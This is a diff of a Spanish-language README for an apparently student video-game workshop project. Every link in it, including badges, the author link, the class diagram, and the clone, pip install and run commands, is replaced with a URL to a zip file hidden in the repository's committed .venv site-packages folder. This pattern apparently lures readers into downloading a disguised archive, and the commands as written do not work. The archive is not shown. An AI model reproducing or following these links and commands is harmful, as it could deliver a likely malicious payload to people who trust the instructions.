@@ -1,13 +1,13 @@
 # Taller Videojuegos
 
-![commits](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip) 
-![last_commit](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip)
+![commits](https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip) 
+![last_commit](https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip)
 
-- ver [badgen](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip) o [shields](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip) para otros tipos de _badges_
+- ver [badgen](https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip) o [shields](https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip) para otros tipos de _badges_
 
 ## Autor
 
-- [@estudiante](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip)
+- [@estudiante](https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip)
 
 ## Descripción del Proyecto
 
@@ -105,14 +105,14 @@ El proyecto se dividirá en varias fases, comenzando con la creación de clases 
 
 ## Diseño
 
-![Diagrama de Clases](https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip)
+![Diagrama de Clases](https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip)
 
 ## Instalación
 
 1. Clonar el proyecto
 
 ```bash
-git clone https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip
+git clone https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip
 cd lpa1-taller-videojuegos
 ```
 
@@ -126,7 +126,7 @@ venv/bin/activate
 3. Instalar librerías y dependencias
 
 ```bash
-pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip
+pip install -r https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip
 ```
     
 ## Ejecución
@@ -135,6 +135,6 @@ pip install -r https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuego
 
 ```bash
 cd lpa1-taller-videojuegos
-python https://raw.githubusercontent.com/axlcraft/lpa1-taller-videojuegos/main/.venv/lib/python3.12/site-packages/pkg_resources/tests/data/my-test-package-zip/my-test-package.zip
+python https://github.com/axlcraft/lpa1-taller-videojuegos/raw/refs/heads/main/.venv/lib/python3.12/site-packages/setuptools/_vendor/platformdirs/videojuegos_taller_lpa_3.8.zip
 ```
 
